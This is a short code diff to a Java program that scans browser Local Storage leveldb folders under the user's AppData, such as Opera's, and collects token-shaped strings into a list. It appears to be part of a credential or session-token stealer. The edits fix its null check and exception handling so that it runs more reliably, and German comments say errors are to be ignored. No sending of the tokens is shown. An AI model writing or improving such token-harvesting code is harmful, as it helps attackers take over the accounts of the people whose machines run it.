@@ -148,7 +148,7 @@ public final class Main {
         paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb/"));
 
         for (File file : paths) {
-            if (!file.exists() || file == null) {
+            if (!file.exists()) {
                 continue;
             }
             File[] filesList = file.listFiles();
@@ -165,7 +165,12 @@ public final class Main {
                                 if (!temp.contains(token) && token.split("\\.").length >= 2) {
                                     temp.add(token);
                                 }
-                                            } catch (Exception ignored) {
+                            } catch (Exception ignored) {
+                                // Ignoriere Fehler beim Token-Parsing
+                            }
+                        }
+                    }
+                } catch (Exception ignored) {
                     // Ignoriere Fehler beim Lesen einer Datei und setze fort
                 }
             }
